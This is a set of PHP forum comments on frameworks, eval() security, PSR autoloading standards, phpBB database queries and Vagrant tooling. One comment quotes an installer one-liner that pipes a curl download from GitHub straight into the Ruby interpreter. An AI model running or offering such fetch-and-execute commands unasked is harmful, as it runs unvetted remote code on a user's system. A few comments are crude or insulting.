You pay diddly-squat in taxes compared to your European counterparts.
I was never able to get puphpet working and judging from the issue tracker others were having problems as well. I'll be giving this a shot, however I'm looking forward to seeing CentOS included.
(c) use a framework. You're right to worry about the viability/maintainability of a mix of WP plugins. A good framework will similarly save you a lot of time, but it will also teach you some best practices and overall empower you to write better code. Laravel sounds right for what you're describing.
Feel free to open any issues if you have any problems. What base boxes for vagrant do you typically use for centos? One of my clients uses CentOS in production so it is something I would like to get working as soon as possible.
I would agree with this, but I would suggest using Laravel rather than Code Igniter. I agree that CI's behind the times, and I think the skills that come along with Laravel (particularly Composer if that's not a skill you already have) make you an objectively better modern developer. While I'm not disparaging CodeIgniter as such, I think there are better current options, even as a first.
I would also advise you to use a framework you can work with (I like working with TYPO3 extension a lot, cause i like extbase) and build it from scratch. If you do it right you will benefit from a steady base in the long run.
I recently made the switch from zend studio to php storm and I'm never going back. My best advice so far is to organize your projects well by keeping base/framework/shared code in its own project and then including that project as a library in any project that uses them. This really helps with php storms code referencing Also use a vcs
Personally, I believe frameworks can give you a big boost in getting a working prototype out the door; but I've always been wary of the potential for being hacked. Take Wordpress for example, it's a great template for making very specific websites; however, let it languish for a few months without administration and the attack vector gets bigger and bigger for automated attackers with each new bug found. You might say, well "no shit, but what's the big deal with making sure it's up to date"? It's not that big of a deal, but it needs to happen, which means it needs to be someone's responsibility on an on-going basis. When resources get thin and an update needs to happen that requires manually doing something and you don't have the resources to do it. The site will languish with large attack vectors until it's hacked. I personally like to make my own frameworks, my own "site engines", coded with my own standards. It's fun, it allows me to learn more, extend the site to do what I want, full source code that I understand and makes for a teeny-tiny attack vector that isn't based on (let's say) Wordpress that is used by a million websites and easily targeted by script-kiddies. 
If you do this with WordPress take the time to learn how to do it right. Many PHP devs butcher WP because they don't have the patience or the foresight to actually figure it out. They have the "I can do it better mentality" and that isn't always the best business decision. For me this comes down to your budget + time, you can accomplish this in WP in a couple days using all your own code, but still having the benefit of WP updates and other plugins that are solid. WP is a long term decision because it maintains backwards compatibility. The downside is that it takes a long time to figure out how to write decoupled and well written WP plugins, because of the sheer amount of functions and hooks which are available. In most cases you cannot rely on plugins to do your work for you, you should write them yourself.
Thanks, I'll definitely be keeping an eye on this. Since you're so involved, here's a slightly related question that I've been having a hard time with... For Vagrant boxes running CentOS, is there a way to include (later) versions of packages that are not in the base repo? For instance, installing a later version of subversion (1.7 when the base repo only has 1.6) can be a hassle. I put a lot more detail in to this question over in /r/vagrant but so far I haven't gotten any hits: [Here's the thread](http://www.reddit.com/r/vagrant/comments/1trhnr/including_latest_stable_versions_of_packages_in_a/)
Yeah, for really crappy script encoding (Anti Theft). =)
I've built a site like this, with multiple markets and tons of traffic. My advice is to use a framework and build from scratch. There are a lot of special cases and considerations required for a proper application of this sort and it would probably be difficult to mold a blogging platform or CMS to your needs. A custom application will handle your edge cases far better, and should be far more maintainable in the future. 
eval doesn't really have a good use in PHP, but removing it from PHP would not do anything valuable. It wouldn't add security or reduce bugs or anything like that. It would, however, break a lot of bad code, which isn't a good thing.
Great to hear from someone who's been there. Thanks!
Yes, eval does still have some valid uses. The key is ensuring you only ever eval strings from known trusted sources, particularly sources that you control, or are controlled by someone that already has the equivalent privilege to running scripts on your server (in the suexec context you've set up, I hope). I have used it when using PHP as a templating language "within itself", e.g. when using PHP as a preprocessor for languages and formats other than HTML (in my case, config files) where you'd like to have the output of that sub-PHP execution as a string within your running code. Could this be replaced with some other mechanism with clearer scoping and better security functionality (I.e. Easy to set no-disk-access, no-network-access, etc)? For sure, and I'd embrace it if it did. Until that time, it's a necessary part in the toolkit. Time was that eval was the only way to bring in certain pieces of dynamism, e.g. before you were able to call functions by variable, like $foo($bar), you had to do eval($foo.'($bar)'); and other such hacks. Things are better now, and so it's conceivable that one day, all the legitimate cases for eval will go away. However, just because it isn't the best practice in the world doesn't mean it should be removed from the language. It should just be removed from common usage. We are talking about the language that added GOTO after the fact, too... So it's not like it can really stand on much in terms of ideological purity!
It certainly has its uses. Imagine you let users create custom rates that depend on service duration, fixed or percentage fees/discounts, etc. If you have to store that to a database, you can obviously create objects that represent each entity, but imagine the following: $total = ($basePrice + $specialTax) * ($premium ? 1.1:1.0) - $couponDiscount Storing that in a database using meaningful entities for each and every part of the formula is an immense pain. On the other hand, storing the above string and eval()ing makes it really simple. The big problem with eval() is that people aren't careful about the origin of the evaluated code. If you have an &lt;input&gt; in your admin where you let the user type his calculation template, you're probably gonna get hacked. On the other hand, if only the people who are admin of the server where your script runs (yourself or the company admins if it's installed there) are able to generate those strings, then it becomes a safe and time-saving hack. Same thing if you're generating those strings from an opaque model (that parses user input without reusing any of it).
Another useful place (potentially, until `include()`ing a stream is a thing) is for mocking libraries to generate code and have it put into the interpreter without having to generate a file.
It's important to realize that `eval()` can be easily displaced by `file_put_contents("/tmp/xyz",...); include(...);`. It's just obscured, but the same thing behind the scenes. Removing it would only serve a meme. More crucial to remember is that it's the one feature that separates interpreted from compiled languages. Shunning the exceptional use cases at all costs does not make you a seasoned coder. Just means you're probably using the wrong language type. As for cracked servers, it's not worthwhile to force obfuscated code to be slightly more obfuscated. Patching the original exploit gates is. 
This was done to work out what the community at large think of the problem. The conversation is (or was) here. https://groups.google.com/forum/#!topic/php-fig/EgvlAyeU4a8
eval() isn't the problem. The problem is trusting your inputs. Never trust your input; always assume the user is a bastard.
Perfect, exactly what I was after! Thank you very much!
As m47t33 was saying, you want to use htaccess to rewrite your URLs. Check out http://stackoverflow.com/questions/1231067/htaccess-rewrite-for-query-string and http://stackoverflow.com/questions/13592535/htaccess-rewrite-url-with-a-query-string If you compare the two problems, and solutions, you should be able to get the answer you want. I searched *htaccess rewrite query string* to get these results. 
I'm in as a subscriber for now. I'm aiming to start a tutorial site in a few months, so I'll see how I can help out.
I´ll try to help out when and where I can.
PSR 1.1 problem solved.
Its worth noting that the /e modifier (PREG_REPLACE_EVAL) has been deprecated from PHP regexp as of 5.5. This will probably break some horrible code somewhere too, but it seems PHP team decided the payoff was worth it. 
This was discussed and everyone agreed it was a bad idea. Replacing a PSR with a new version of the same PSR makes the user of the previous version feel like their compliance is now outdated. Whatever happens, compatibility with a PSR now has to mean the same level of compatibility with that same PSR in a week, a month, a year or a decade. Sure you could be compatible with a deprecated or superseded PSR, but it would ALWAYS be compatible nonetheless. That is why we made PSR-4, and not PSR-0.1 or PSR-0v2. :) 
Such a shame really. I doubt I'll ever advocate for any of the PSRs beyond PSR-2. With a lack of packaging in PHP I expect pathnames to provide at a glance information that PSR-4 hides forcing me to consult multiple configurations to determine namespace or FQCN. Not going to ask anyone I know to intentionally hinder their projects or something I work on by implementing that ridiculous autoloader mapping. My preference would be that PSR-1 remains unmolested and something mentioned in the errata about PSR-4.
There's a substantial difference between an uncommon function like the e modifier, and a common function like eval. The dangers of the e modifier were also far more immediate and substantial, as it allowed arbitrary code execution when used in a common fashion. The eval function is much less dangerous, because you're far more aware of the fact that using it will execute arbitrary code.
You'll will also get hacked if you do a bad job at filtering any of the variables in that expression. I suggest checking out Symfony2's Expression Language (https://github.com/symfony/expression-language). It let's you compute expressions without access to PHP functions and such. You can also compile them for performance.
I think it safe to assume the user is a bastard 100% of the time. I've never met one that wasn't. 
phpBB should have RSS feeds per-forum built in, no? Why not just use that?
I'm learning HTML5 and would love to be part of this. I'm about to start learning PHP and MySQL. So I'll eat up this information. 
Firstly this is not molestation, just "or PSR-4.". PSR-2 would need the same if PSR-1 was to ever be replaced, which one day it will be. Secondly your distaste for PSR-4 should not spread distaste for PSR-3, PSR-5 or PSR-6. Finally, what are you talking about? Do you actually understand PSR-4? Look at literally any major framework which is installed via Composer. Does the path name match the FQCN? No, it has their composer package in there, and then you have to click through extra folders for no damn reason. This cuts out a few of those extra folders, but keeps the initial "which composer package is it in" which is as much of an "issue" in PSR-0 as it is in PSR-4. 
Did you listen to my video? I'd love to do that, but I'll be strung up.
Or use one of those sandboxed javascript engines. I let my users write javascript, store it in a database, and then evaluate it. In the end all they really get access to is setting one variable to some number.
&gt; I have my own system and model for organizing all my code Well, that's what a framework is. However, the popular frameworks that are in use now are probably more secure, better documented, more robust, and easier to maintain that what you've done. No offense or anything, it's just the guys who built Symfony, Zend, CI, etc. have been doing this for more than 5 years - and there's typically several good developers contributing to the codebase and documentation.
I think that you are on a wrong track with mod_rewrite. Rather try to learn more about RESTful pattern. If this pattern is too complicated for your needs try to search for implicit routing. Basicly when you call url like example.com/somefeature/data implicit routing will call method somefeature and will pass that data to it. Modern frameworks like laravel etc. will boost your deveopment a lot and will guide you i right direction. Little tutorial that might help you with that concept https://laracasts.com/lessons/understanding-rest
My friends and I did this many years ago. The RSS feed is an option, but we wanted to embed the content in another page with absolute control over everything, including reskinning the information as news articles, only displaying certain bits of information etc. It worked great! It's relatively easy too, the gist of it is writing a small php script that connects to phpBB's MySQL database on your server, queries the desired information with SQL, then formats it as HTML. You can find plenty of tutorials online for doing that.
Not php centric but here's a wikipedia link - [REST](http://en.wikipedia.org/wiki/Representational_state_transfer) the overall concept.
I'm sure that eval has a few edge cases left, but they're few and far between. In a lot of cases, if you're using eval() it's because you haven't thought outside the PHP box for a better solution. People seem to forget that there's no shame in mixing other tools with PHP to achieve an optimal outcome.
Yes I did listen to your video and I was just saying that I don't understand why it's such a problem. You are 100% correct in what needs to be done, just do it. Nobody is gonna flip out because the concrete rules were changed for such a thing. This isn't the Constitution, adding in that little bit isn't gonna change someone's rights. 
Just because you're not using a pre-built framework, doesn't mean your "own system and model for organizing all my code" isn't a framework. Benefits is that you do not have to maintain that code, and it's wide usage means less edge cases missed that could cause you problems.
If it's that important you create a DSL, or use a specialized sandbox. You don't let users mash in PHP. &gt;it becomes a safe and time-saving **hack** That's how PHP scripts become crap - when you start using hacks instead of proper solutions.
Learn more about RESTful concept and use some framework which will handle the routing and give you a lot of help
The only possible explanation I could come up with for a question like this that I've been asked so frequently is this: "Most programmers are broken-legged idiots, and frameworks are the crutches that we use to get from place to place. Crutches aren't inherently good or bad, more of a neutral medium, and for many, entirely necessary." Or something along those lines.
I tried installing on ubuntu 12.04 as per the instructions but am getting an error: &gt;ruby -e "$(curl -fsSL https://raw.github.com/protobox/protobox/master/ansible/shell/bootstrap)" &gt;Press ENTER to continue or any other key to abort &gt;-e:189: command not found: /usr/bin/sw_vers -productVersion &gt;-e:133: undefined method `&lt;' for nil:NilClass (NoMethodError) 
&gt; Just because you're not using a pre-built framework, doesn't mean your "own system and model for organizing all my code" isn't a framework. So what's a framework, then? Any collection of code? To me, it seems like a buzzword.
Fair enough https://groups.google.com/forum/#!topic/php-fig/EgvlAyeU4a8 There is always a route to take, and I have to work out what that is. I definitely can't just edit the file and expect to have any place in the FIG tomorrow. I can however start a survey, asking for routes that people might be interested in. 1. Annotate with a "cf. Errata" link 2. Add "or PSR-4" 3. Replace "PSR-0" with "an autoloading PSR: see PSR-0 and PSR-4" 4. Nothing What would people here pick if they had a vote?
I believe I've seen it used on some cms templates as a way to keep their footer credits/link in there and pretty hard to get rid of unless the person knows what they're doing.
2 if no chance of another autoloading PSR is introduced (which why should it? PSR-4 is perfect), otherwise to make THOSE people happy, 3.
 &lt;?php class Foo { private $vars = array(); public function write($msg) { echo $msg; } public function input($var, $val) { $this-&gt;$vars[$var] = $val; } public function output($var) { $this-&gt;write($this-&gt;vars[$var]); } } Bam, a framework! It's a collection of code and it's reusable! (Please note the use of sarcasm and literal interpretation)
&gt; However, the popular frameworks that are in use now are probably more secure, better documented, more robust, and easier to maintain that what you've done. &gt;No offense or anything, it's just the guys who built Symfony, Zend, CI, etc. have been doing this for more than 5 years - and there's typically several good developers contributing to the codebase and documentation. Oh I completely agree. I just have trouble coming to terms with the effort involved in learning/using a framework if what I have created gets the job done for what I need it to do. I **am** starting to see some of the benefits though in regards to documentation and bringing other developers on as well as the enhanced security and code efficiency. I **would** argue, however, that what I have created might be a little easier for me to maintain and a bit more robust for my needs since they were the needs in mind when I created it but the rest I will agree is 100% accurate.
Yeah I know what you mean, but I'd rather not fix a problem now by just pushing it back a year, because a year later I'll be having the same argument. 3 means we agree that lists of references can be added to over time. 
"Don't reinvent the wheel" is said by the same people that either already agree with their framework's decisions or don't want to delve further and educate themselves. We didn't get the extremely efficient metal-reinforced rubber tires and steel rimmed wheels by choosing not to reinvent the wheel. If we all adopted that attitude, we'd still be carving holes into rocks and putting logs through them. A programmer isn't going to truly understand a design decision until its pros and cons have been thoroughly explored, usually by discovering the pros and cons during development or playing with the code directly. Prebuilt solutions offer utility, not education. There's nothing wrong with that, but many people like to push frameworks as the end-all, be-all pinnacle of development when they're merely another tool.
&gt; PSR-0 and PSR-4 are currently two alternatives. Which I think is a bad idea. What is the point of having alternative standards within a standard. That just causes confusion on which one I should be using / supporting. &gt; But what im calling is not actually a change But it is, when someone says their lib is PSR-1 compliant, I will no longer know if their classes and namespaces are compatible with PSR-0 or PSR-4. If you are going to modify it I would just remove that line entirely and not care about autoloaders. That autoloading standard should define directory structure not the code style ones. It figures that the php standards would start to turn into spaghetti. Single responsibility principle should be applied to these standards. One of the good things about PSR-3 is that it doesn't care about any other PSRs. 
Sure, just connect to the database and pull out the information you want. The hardest part is figuring out the schema, but as long as they're using sensible table and column names it shouldn't be too difficult. 
Doesn't each of these though not address the reason you're having this difficulty in the first place - that the groups by-laws explicitly states that each standard is set in stone after its created, but that you have created a new backwards compatible alternative that you weren't able to envisage when creating PSR-1? Would it not be more effective to adjust the by-laws in a way that protects the sanity and authority of the standards whilst allowing revisions that don't affect the previous implementations of that standard? i.e "PSR's can have addendums/amendments so long as those amendments don't cause any existing implementations of that standard to no longer follow said standard". Essentially Backwards Compatibility will be sacrosanct. Unless I'm missing some other reason they shouldn't be modified? 
This mentality of "you should understand how everything works before using it" blows me away. I realize that understanding Dependency Injection and Inversion of Control helps me to decipher what's going on in Laravel (and Symfony) .. it helps me design better software since I know how to leverage TDD, mocks, and whatnot. The truth is, I learned this stuff because modern framework leveraged them - not the other way around. Would you suggest that we should all code in machine language (or assembly) because that's the only way we'll come to understand the underlying mechanisms of "true" software development? Not everyone who makes a blog or simple website needs to understand design patterns and &lt;insert acronym here&gt;. PHP itself is a framework, built on C, which is a framework, built on the C compiler which translates C into machine code. I don't need to understand the PHP JIT compiler and source to use it, that's what the documentation is for.
There are a bunch of ways to do execute code without `eval()` For example, `include`/`require` and streams allows you to run code without `eval()`, I blogged about this one [in 2009](http://daveyshafik.com/archives/232-avoiding-eval.html).
&gt; I learned this stuff because modern framework leveraged them - not the other way around. Congrats. Not everyone learns the same way, the same things, or for the same reasons. I would not use a framework until I could understand what it's doing through either reading its source/documentation or a semi-thorough explanation of its design rationale. &gt; Not everyone who makes a blog or simple website needs to understand design patterns and &lt;insert acronym here&gt;. You're right, not everyone who makes a simple site needs to know that. Conversely, not everyone is content to use something prebuilt and continue on, blissfully ignorant of what they're actually using. The machine code bit is a deliberate exaggeration of my stance, so I won't indulge it. What did Laravel or Symfony teach you about **PHP**? I'm sure they taught you plenty about how *they* did things, but what did you learn about the language and software dev in general? Therein lies the problem. If you don't care about learning that stuff, then you're obviously not going to relate to or understand my stance.
&gt; What did Laravel or Symfony teach you about PHP? Nothing really, I had a pretty good understanding of the language and syntax before I started leveraging frameworks. This is probably why I can easily dig through the vendor code and grasp how or why a method is behaving a certain way. &gt;what did you learn about the language and software dev in general I touched on this already, having some SOLID (see what I did there) examples to go by, I taught myself TDD, design patterns, etc. Stuff that the official PHP docs are actually rather DRY about.
Can file a github issue (https://github.com/protobox/protobox/issues) with the errors you are experiencing? I have only tested that bootstrap installer on OSX. In any case you could always use the git based installer. The bootstrap installer is just a one-liner to do the same thing.
People who just want something done ASAP aren't looking for a learning experience. But that's a small crowd. I think most of us DO seek to understand a framework rather than just use it. &gt; But for **some of us**, we need explanations and supporting reasoning for practices. We don't just accept and follow them blindly. Questioning things is good Forget "some of us", it's more "the vast majority of us". A framework could potentially be bad in the hands of a poor developer who doesn't question anything. Most of us are not those people. Frameworks are mostly used to speed up the work of competent developers rather than to help people do things they *couldn't do*.
&gt; We don't need another procedural mess like WP or Magento Magento is based on the Zend framework, it is definitely not procedural; are you thinking of Drupal?
A lot of fatherless users around your neck of the woods, eh?
Yes. I would argue that the option to eval() should be in every general purpose or web language.
Obviously im in the minority here, but there is no reason you cant do both. I find with most projects like this, building the customer-facing side of things is 20-30% of the work, while building the administration of it is the remaining 70-80%. Using something like wordpress can speed this up quite a bit. And what many people dont realize is you can build a MVC type framework on top of wordpress pretty easily with a few classes, and intercept the crazy rendering that wordpress does. My opinion has always been that the biggest attraction of wordpress is its very polished admin interface and it can be worth taking advantage of. Ive always dreamed of something where you could basically extract the wordpress admin and plop it down into my own app.
I strongly recommend dropping whatever your doing and just fork out 19 Euro for [rsform pro](http://www.rsjoomla.com/joomla-extensions/joomla-form.html). It has a really nice admin component to easily create/edit forms that practically anyone can do. (it even has mailchimp and anywhere support) edit: grammer
Your wording is a little strange, but I'm going to assume you mean "externally" as in "outside the phpbb environment but still on the same host." Here is the code I use for phpbb 3 to accomplish this: Start of the file: &lt;?php define('IN_PHPBB', true); $phpEx = substr(strrchr(__FILE__, '.'), 1); $phpbb_root_path = (defined('PHPBB_ROOT_PATH')) ? PHPBB_ROOT_PATH : 'phpBB/'; // Change 'phpBB/' to the location of your phpBB install relative to where this PHP file is located. include($phpbb_root_path . 'common.' . $phpEx); include($phpbb_root_path . 'includes/functions_display.' . $phpEx); include($phpbb_root_path . 'includes/bbcode.' . $phpEx); // Start session management $user-&gt;session_begin(); $auth-&gt;acl($user-&gt;data); $user-&gt;setup('viewforum'); This basically sets the rest of the file up to use anything from phpBB. Then, when you need to actually read out the posts from a specific forum, you can do this: $sql = 'SELECT * FROM `phpbb_topics` WHERE `forum_id` = &lt;ID OF FORUM HERE&gt; ORDER BY `phpbb_topics`.`topic_id` DESC LIMIT &lt;HOW MANY THRADS TO DISPLAY&gt; '; // Replace the appropriate sections with the numbers you want. $result = $db-&gt;sql_query($sql); while($latestNewsTopic = $db-&gt;sql_fetchrow($result)) { $sql = 'SELECT * FROM `phpbb_posts` WHERE `post_id` = ' . $latestNewsTopic['topic_first_post_id'] . ' LIMIT 1'; $post_result = $db-&gt;sql_query($sql); $latestNews = $db-&gt;sql_fetchrow($post_result); // Code here for displaying the thread's content. }
&gt; Thoughts? Fuck Rasmus!
Avoiding it and arguing against it's existence are two different things.
I think this may be pushing wordpress much further than it was designed to go. I would agree with the framework advice. You should also look at drupal. Most of what your talking about could be built in Drupal without a line of custom code. The question is what does your maintenance model look like? How long will you be associated with the project? How much of the site do you want a non-technical admin to maintain? One factor that differentiates developers is their ability to plan for their own succession. If you leave this project, it's pretty easy to find a Drupal admin. It also easy to find someone with framework experience. You'll never find someone who's worked with your custom built from scratch amazing system. Often, with a custom system, no matter how well documented it is, it will be tossed out and replaced with whatever is the preferred system of you successor. Edit: grammar
FYI it looks like current Symfony2 benchmarks are missing a cache warmup before the actual test is run. This has been fixed since the most recently published version of the benchmarks: https://github.com/TechEmpower/FrameworkBenchmarks/pull/650
No tests? No Composer? No PSR? I like the idea, but clean this baby up!
Dangerous to imply that Laravel is just a stepping-stone to Symfony2 or in any way inferior. They're both very powerful frameworks but serve different audiences. Neither is necessarily *better* than the other in the same way that Coke isn't *better* than Pepsi - it's just a different approach to achieve the same goals.
Yeah. That happened when I uploaded to GitHub. I'll fix soon!
Yessir!
Yeah that's pretty much what I'm saying. Set in stone is good EXCEPT updating references. Maybe I should push a vote to update the bylaws to make this exception part of "the code", so we don't have to worry about any potential "willy nilly amendments". That's one of the few logical routes I've been talking about instead of supporting the "no change ever" approach we seem to have now.
Huh? So all standards should last forever? Or should we have deleted/superseded PSR-0 immediately and flipped the bird to every single PSR-0 implementer out there? I don't see how any of those is uselfull. The reason it says "or" is because you can use either. If ou know what PSR-4 is you'll know that the difference in the PHP source files is completely identical, it's just folder structure that changes. So supporting PSR-0 or PSR-4 is fine. Calling PSR-3 into this conversation is silly. It assumes elements of PSR-1 because camelCase: it assumes PSR-0 because it requires a PSR-0 (or potentially PSR-4) package. I get the feeling that you feel like you made a really valid point but I'm having a hard time believing you have a clue what you are taking about...
Expression Engine also has a nice admin that is less coupled with a blog form of data. I would imagine it's easier to dev with as well (built on Code Igniter, sort of), but don't have any experience with that side of things. (Though, I did work with a page that had embedded php in it and lived in an EE site...)
I think the coincidence of the common convention to name a Composer package similarly to source namespace is what drives the confusion within the vendor directory. If you look at another tool, Apache Maven and how the repositories are structured using groupId, artifactId, and versions as compound identifiers for a given dependency you'll see a key distinction between the package namespacing and the package identifiers. It seems to me PSR-4 wants to circumvent the explicit relationship between namespace and filepath established within PSR-1 using the package identifiers which seems wrong. Maybe this is the correct direction for the PHP-FIG and mapping "vendor namespace" to source namespace works out well, I cannot say either way, but it's change and change is scary damn it. Please, correct me if I'm wrong because this has been my understanding for months now. What really bothers me about PSR-4 is that autoloader mapping for an arbitrary namespace to a directory structure abstracts the FQCN and you must consult the configuration to be absolutely sure; this diminishes the at-a-glance information PSR-1 seems to enforce. e.g., /path/to/aura-web/src/Response/Status.php How can you determine the FQCN of the class within that file without referencing the configuration? Section PSR-4 2.2.ii seems to imply there might be sub-namespaces within the FQCN not reflected in the filepath. Is this not the case? Couldn't the FQCN of this file be \Aura\Web\Http\Response\Status() ? As for PSR-3, 5, or 6. I am extremely hesitant to get on board supporting a process for something as critical as logging, caching, and documentation standards when I still see people arguing about how amendments are to be applied. I look at the way JCL and the logging API from ~10 years ago is still affecting Java today, and I cringe.
&gt; Huh? So all standards should last forever? Never said that. Quite the opposite really. &gt; Or should we have deleted/superseded PSR-0 immediately and flipped the bird to every single PSR-0 implementer out there? I don't see how any of those is uselfull. No it should have been deprecated. As it pretty much will be. You are just deluding newcomers by saying it is somehow still a valid choice. &gt; Calling PSR-3 into this conversation is silly. Not really, I was using it as an example of a PSR done right. &gt; It assumes elements of PSR-1 because camelCase: Yes it follows PSR-1, but that doesn't mean the library that implements the logger has to for anything outside of the logger interfaces functions. &gt; it assumes PSR-0 because it requires a PSR-0 (or potentially PSR-4) package. I can include files manually if I so choose. PSR-3 is essentially a lib like any other. My project doesn't need to follow PSR-0 to 2 to support it. &gt; I get the feeling that you feel like you made a really valid point but I'm having a hard time believing you have a clue what you are taking about... Hah, do you say that to everyone that disagrees with you? 
Woops! Added them. Can you please explain your question? Sorry.
This kind of taxonomy is basically what Drupal was made for. 
Even though Ellis lab has been looking for new owners, code igniter is not dead. 3.0 is still being developed (although slowly) and is pretty stable at this point. Code igniter is still at the core of many actively developed projects including pyrocms which is a member of php-fig along with laravel and symfony ( my apologies) Although I don't use code igniter for any of my personal projects any more ( or at my job) , it's still a stable, simple to learn framework. 
HOLY SHIT! Looks like an awesome community! Is there anyway I can help too?
Say you want to execute a code snippet saved in a DB or something. What would you do?
There is a lot I could comment on, but I’ll begin with two questions: First, could you explain the advantage you saw in using static methods rather than requiring that a router object be instantiated? Second, why did you choose to use a magic method when the finite list of HTTP methods (GET, POST, HEAD, PUT, DELETE) could easily be covered by five non-magic methods?
Imagemagick. http://www.imagemagick.org/script/index.php
Do a search for "gimp masks" and you will see
Honestly? Not ever do that. 
This is a great point. Closing a door while all the windows are open doesn't increase security notably.
&gt; It would, however, break a lot of bad code, which isn't a good thing. We'll have to agree to disagree on that one. :)
They're routinely used in finite state machines. Whatever the hell that means. :)
No, graphicsmagick. Less bugs, better performance, saner design. 
How does breaking code help anyone? If someone is using eval, they'll likely just change it to something even uglier when it breaks, like throwing it into create_function as an IIFE.
They're both the same shit as far as resizing and merging is concerned. I'm not going to let this devolve into another graphicsmagick vs imagemagick argument. For OP, either is suitable.
It's easy enough to forcefully disable, https://github.com/krakjoe/uneval However, when you do that, you may well find your software doesn't work anymore; because it is a standard part of PHP and it is in use, things that spring to mind are Symphony and Twig, but it's definitely in use, everywhere. That's the reason for it's prolonged existence; it's actually useful, and being used.
Use [Imagine](https://github.com/avalanche123/Imagine). It'll use GD or the *magick extensions and you don't need to care which is available.
When a route isn't found and there is no custom error route defined, you are simply echoing 404. Why do you not return a response with a 404 status code and a more user friendly default error message? E.g. page cannot be found.
A state machine is something that tracks a sequence of events (which determines a state) that determines an outcome. It's unlikely you'll ever have to worry about this in PHP, and you probably won't ever need goto if you do find you need one.
WHAT?! Learn more than one thing?! OUTRAGEOUS!
this is what happens when you insist on using tabs, when everyone tells you to use spaces
Yeah! All the code is on github, http://www.github.com/tgpo Check it out and let me know how you would like to help.
You'll never get anywhere with that mentality. I've seen it all to often with senior devs not willing to expand and then being thrown out because they've not pushing the company forward with ready built and tested open source solutions. 
some motherless users too... definitely don't trust them.
Sorry, I'm just going to call on this because it's bullshit. It's semantically correct, but pragmatically useless. When someone says "Should I use a framework or copy my code from 1997?" the response that your code from 1997 **is** a framework is completely unhelpful. When someone says "a framework" it seems to me completely obvious that they mean "an established modern MVC Framework in popular use", not some arbitrary collection of code libraries. You are technically correct. The worst kind of correct.
Keep up the awesome work, loving Bolt! +/u/dogetipbot 50 doge
PATCH, UNLINK, LINK, etc etc ...
^__[Verified]__: ^/u/ummjackson ^-&gt; ^/u/bopp __^Ð50.000000 ^Dogecoin(s)__&amp;nbsp;^__($0.0200298)__ ^[[help]](http://www.reddit.com/r/dogetipbot/wiki/index)
I definitely do not disagree. Just as you said, it's a benefit of using frameworks as a tool, keyword being "tool".
There are a huge number of benefits to using a framework, and of course some disadvantages that you trade those advantages for. Consider what *a whole lot* of php applications do: 1. Get information from a database and display it 2. Store information in a database from user input 3. Edit already information already stored in a database from user input 4. delete information stored in a database Frameworks let you build that kind of stuff astonishingly quickly. The boilerplate that you have to go through every time you build a web application is taken away from you - and you get to concentrate on writing the bits which make your application unique... you know, the "fun stuff". Frameworks (speaking of popular ones here) also provide you with a massive amount of code which is already tested and hardened against exploits and the like. You generally get protection against things like CSRF and mass assignment exploits without having to worry about building them yourself. You also get a good solid structure which is easy for you and for others to follow. Once you are aware of a framework's conventions you know that everything has its place and there is a place for everything. Frameworks tend to bring other goodies along - an ORM, Authentication handling (another tedious thing you generally have to build from scratch all the time), template languages (and yes, some will argue this isn't a "feature" and PHP is already a template language...but whatever), and much much more. And because everything is built on a series of conventions, frameworks tend to support collaborative work much better. I've worked on projects recently which did, and did not use frameworks. The project which used a framework is consistently producing better output more often. Which is the *key* advantage of a framework - productivity. It doesn't EXCUSE you from knowing what you are doing. The argument that people learn frameworks and don't understand the language is complete bullshit - bad developers are bad developers...whether they use frameworks or not. The disadvantages? There is a chance that overall performance might suffer - though this is unlikely to be a major issue for most. You also lose a degree of flexibility - by the very nature of frameworks you end up having to do things the way the framework dictates. I would argue the loss of flexibility is desirable in a lot of instances because of the benefits of having a common way to work within a team. You do end up being dependent on code which you don't maintain, so you need to be careful to chose something which has a good community and you can bet will be supported for the long haul. There are really only a handful of frameworks right now which fit this bill but it is an important one. Picking a popular/well supported framework also increases your chances of employing people who know the framework which will save you money if you are hiring people to work on your thing. Really, most of the arguments *against* using a framework seem to boil down to a "not invented here" mentality... There are also some people who just wont learn or don't like to consider that there is a better way. There are some legit reasons for not doing it but in most cases productivity, maintainability, testability and so forth beat those arguments down in fairly short order. 
Very well but. Thanks for the insight!
Sorry, but bullshit. Bad developers are bad developers, whether they are using frameworks or not. To say that framework users avoid learning the language is ridiculous on the face of it. But seriously why write the same stuff over and over and over? Whether you are using a 3rd party framework or something of your own making, you are still doing it for the same reasons - laziness (or rather, productivity). You still avoid the extra learning you advocate. And you don't need to understand fully every decision made for you. If you work in a team of people this would hardly ever be the case, even for beautifully handcrafted, frameworkless software. You need to be confident that something works and is reliable and fit for purpose, but understanding every nuance of it is a waste of your time and your employers money. You also don't need a reason for accepting practices - questioning IS good but if you are satisfied that the majority of what is being pushed by a particular group of people is accurate and good then you can bank on their expertise and accept other stuff as well. As you get on in your professional career you'll know when you can sniff out bullshit and when to question...and when to just go "that seems reasonable" and GET ON WITH IT. Questioning things is healthy - obsessing over every single bit of detail and how decisions were made is not. 
No we got metal-reinforced rubber tires because wheels were iterated on. The wheel was never reinvented. The wheel was built upon.. its basic design hasn't changed. The point is the wheel works. I'd much rather "educate myself" by solving things which are not already solved. You know...like my client's requirements. 
There could be some S curve stuff going on here. You would argue that RIGHT NOW is easier for you to maintain and productive enough for you to work in. You see that learning a framework is an overhead, and you can't **quite** see what the benefits would be to you... You'll find with all things when you change the way you work the initial impact is you get worse. Things slow down. It takes you longer to do tasks which were trivial before. The urge will be to go back to the old ways of doing things. If you fight the urge, and what you are actually trying to do is beneficial (and determining that is beneficial is non-trivial), then long term you will come out in a better place. Faster, more productive, easier to maintain. Then you go looking for the next improvement...and you go through all the pain of sucking again, being slow, etc etc. It's counter intuitive, but every innovation you go through will be case of "go slower to get faster" - go slower now, get faster in the long run.
I would recommend changing the name because there is a web design tool that is also called [Macaw](http://macaw.co/).
You have equal numbers of upvotes and downvotes. I think because of the ambiguity of what you're saying. People can interpret it as either a criticism of frameworks, or a criticism of **the question**. There are two possible interpretations here. One is that you're saying that when people ask this question, what they're actually saying is: &gt; Most programmers are broken-legged idiots, and frameworks are the crutches that we use to get from place to place. Crutches aren't inherently good or bad, more of a neutral medium, and for many, entirely necessary. Not what **you're** saying, but what they are. The other option is that is what you're saying about frameworks. That frameworks are a crutch. I actually don't think that's what you're saying, but if it is, then it's an incredibly dumb argument.
suhosin.executor.include.whitelist and make sure that's on a read-only remount in your chroot.
&gt; Say you want to execute a code snippet saved in a DB or something. What would you do? Seriously re-consider my meds.
Mainly just flexibility.
Amen. High level abstractions like frameworks are meant to facilitate and simplify the layer below. This whole "but you won't understand what's happening" is anti-progress herpaderp by people who are blind to the much needed changes in the language and industry.
Yeah, someone told me that on HN. I think I'll keep it for now, but if anyone contacts me from their company, I'll change it.
